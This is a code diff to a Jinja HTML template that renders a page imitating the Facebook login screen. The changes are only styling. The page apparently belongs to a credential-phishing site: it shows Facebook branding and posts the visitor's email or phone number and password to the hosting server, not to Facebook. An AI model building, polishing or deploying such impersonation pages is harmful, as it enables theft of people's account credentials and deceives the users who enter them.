@@ -1,22 +1,21 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card center" style="flex-direction:column;align-items:center;text-align:center;max-width:520px;margin:28px auto;padding:48px 32px;">
-  
-  <!-- Facebook Icon and Heading -->
-  <div class="icon-circle bg-facebook" style="width:72px;height:72px;box-shadow:0 0 12px rgba(24,119,242,0.25);margin-bottom:18px;">
-    <i class="fa-brands fa-facebook-f icon-lg" style="font-size:30px;"></i>
+<div class="card" style="max-width:520px;margin:28px auto">
+  <div class="platform-header">
+    <div class="icon-circle bg-facebook"><i class="fa-brands fa-facebook icon-lg"></i></div>
+    <div>
+      <h2 class="notranslate" style="margin:0">Facebook</h2>
+      <div style="color:#64748b;font-size:13px">Please login to continue</div>
+    </div>
   </div>
-  <h2 class="notranslate" style="margin:0 0 6px;font-size:26px;font-weight:700;color:#1877F2;">Facebook</h2>
-  <p style="color:#64748b;font-size:14px;margin-bottom:28px;">Please log in to continue</p>
 
-  <!-- Login Form -->
-  <form method="post" style="width:100%;max-width:360px;">
+  <form method="post" style="display:flex;flex-direction:column;gap:12px;">
     <input 
       class="input" 
       name="address" 
       placeholder="Mobile number or email address" 
       required
-      style="margin-bottom:12px;"
+      style="padding:14px 16px;border-radius:12px;border:1px solid #e6eef8;font-size:15px;box-shadow:0 4px 10px rgba(15,23,42,0.03);transition:all .2s ease;"
     >
     <input 
       class="input" 
@@ -24,15 +23,17 @@
       type="password" 
       placeholder="Password" 
       required
-      style="margin-bottom:18px;"
+      style="padding:14px 16px;border-radius:12px;border:1px solid #e6eef8;font-size:15px;box-shadow:0 4px 10px rgba(15,23,42,0.03);transition:all .2s ease;"
     >
-    <button 
-      class="btn btn-blue" 
-      type="submit" 
-      style="width:100%;font-size:16px;font-weight:600;border-radius:10px;">
-      Log in
-    </button>
+    <div class="center">
+      <button 
+        class="btn btn-blue" 
+        type="submit"
+        style="width:100%;max-width:360px;padding:12px 18px;border-radius:12px;font-size:16px;font-weight:600;box-shadow:0 6px 16px rgba(24,119,242,0.2);transition:all .2s ease;"
+      >
+        Log in
+      </button>
+    </div>
   </form>
-
 </div>
 {% endblock %}
